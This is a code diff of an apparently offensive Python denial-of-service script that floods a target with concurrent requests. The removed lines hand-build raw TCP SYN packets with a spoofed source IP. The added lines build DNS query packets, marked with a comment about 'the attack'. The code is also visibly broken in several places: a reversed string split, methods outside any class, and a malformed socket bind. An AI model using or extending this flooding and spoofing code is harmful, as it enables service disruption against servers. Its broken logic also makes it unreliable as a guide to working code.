@@ -10,7 +10,7 @@ import sys
 ###### This only runs on linux #########
 
 # Delay factor, some noise is added.
-DELAY = 1
+DELAY = 5
 
 # Number of concurrent requests that are happening, threads are not used.
 # To get this above 1024 on linux, you have to edit /etc/security/limits.conf
@@ -29,48 +29,43 @@ async def hit_server(target: str):
         *[asyncio.create_task(papercut(target, i)) for i in range(CONCURRENT_REQUESTS)]
         )
 
-# Returns an ipv4 address in 1.2.3.4 format as a binary string
-def ip_bin(ip: str):
-    out = ""
-    for i in ".".split(ip):
-        out += chr(int(i))
-    return out
+def send_packet(self):
+    packet = self.build_packet()
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(1)
+    sock.sendto(bytes(packet), (self.ip, self.port))
+    data, addr = sock.recvfrom(1024)
+    sock.close()
+    return data  # reomove this later for the attack
 
-# Formats the port into 2 bytes
-def b16s(port: int):
-    assert port < 2**16
-
-    out = chr(target[1])
-    if len(out) == 1:
-        return '\0' + out
-    else:
-        return out
+def build_packet(self):
+    randomint = random.randint(0, 65535)
+    packet = struct.pack(">H", randomint)
+    packet += struct.pack(">H", 0x0100)
+    packet += struct.pack(">H", 1)
+    packet += struct.pack(">H", 0)
+    packet += struct.pack(">H", 0)
+    packet += struct.pack(">H", 0)
+    split_url = self.url.split(".")
+    for part in split_url:
+        packet += struct.pack("B", len(part))
+        for s in part:
+            packet += struct.pack('c', s.encode())
+    packet += struct.pack("B", 0)
+    packet += struct.pack(">H", 1)
+    packet += struct.pack(">H", 1)
+    return packet
 
 # Single job that will keep attempting to 
 # send requests to the server that _will_ time out.
 async def papercut(target: str, i):
     # AF_PACKET needs root
     soc = socket.socket(socket.AF_PACKET, socket.SOCK_RAW) 
-    soc.bind(("wlp1s0", 0))
+    soc.bind("wlp1s0", 0)
     pfl('N') # new
 
     while True:
-        ip_packet = ("\x45\x00\x00\x3c\x2b\xb5\x40\x00\x40\x06\xe0\x56" +
-            ip_bin("192.168.1.115") + # source ip spoof
-            # ip_bin("127.0.0.1") + # spoof self? does this work?
-            ip_bin(target[0])) # dst_addr
 
-        # tcp packet, took this from a random wireshark packet
-        tcp_packet = (
-            "\xa2\x9c" + # source port
-            b16s(target[1]) + # destination port
-            "\xc0\xbd\xb9\x02\x00\x00\x00\x00" + 
-            "\xa0\x02" + # flags, 02 part here=syn 
-            "\xfa\xf0" + # the rest is w/e
-            "\x2e\xdf\x00\x00\x02\x04\x05\xb4\x04\x02\x08\x0a\x07\x0d\xd1\x3c" +
-            "\x00\x00\x00\x00\x01\x03\x03\x07")
-        pak = ip_packet + tcp_packet
-        await soc.send(pak)
         pfl('S') # sent a packet
         await asyncio.sleep(random.random()*DELAY)
     soc.close() # probably never gets here
@@ -79,7 +74,7 @@ if __name__ == '__main__':
     import sys
     target = None
     if len(sys.argv) == 1:
-        target = ('localhost', 25565) # some open tcp port
+        target = ('localhost', 80) # some open tcp port
     elif len(sys.argv) == 1:
         target = sys.argv[1]
     asyncio.run(hit_server(target))
